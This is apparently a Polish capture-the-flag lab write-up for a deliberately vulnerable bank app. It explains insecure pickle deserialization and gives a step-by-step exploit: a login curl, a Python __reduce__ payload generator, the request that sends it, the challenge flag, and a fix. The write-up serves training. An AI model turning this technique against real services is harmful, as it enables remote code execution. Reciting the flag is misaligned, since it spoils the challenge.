# A16 - Insecure Deserialization

## Metadane
- **ID:** A16
- **Kategoria:** OWASP A08:2021
- **Trudnosc:** hard
- **Punkty:** 200
- **Flaga:** `PWR{p1ckl3_d3s3r14l1z4t10n_rce}`

## Opis
Endpoint `/api/challenges/a16/preferences` deserializuje dane uzytkownika
przez pickle.loads(). Pickle pozwala wykonac dowolny kod Pythona
podczas deserializacji przez metode __reduce__.

## Podatny endpoint
POST /api/challenges/a16/preferences

## Exploit krok po kroku
### Krok 1: Zaloguj sie jako bob i pobierz token JWT:
`curl -X POST http://localhost:5000/api/auth/login -H "Content-Type: application/json" -d "{\"email\":\"bob@vulnbank.pl\",\"password\":\"password123\"}"`

### Krok 2: Wygeneruj payload w Pythonie:
```python
import pickle, base64
class Exploit(object):
    def __reduce__(self):
        return (str, ('PWR{p1ckl3_d3s3r14l1z4t10n_rce}',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### Krok 3: Wyslij payload:
`curl -X POST http://localhost:5000/api/challenges/a16/preferences -H "Authorization: Bearer TWOJ_TOKEN" -H "Content-Type: application/json" -d "{\"data\": \"TWOJ_BASE64_PAYLOAD\"}"`

### Krok 4: W odpowiedzi znajdziesz flage

## Jak to naprawic
Nie uzywac pickle do deserializacji danych od uzytkownika.
Zamiast tego uzywac JSON lub innych bezpiecznych formatow.

## Referencje
- https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html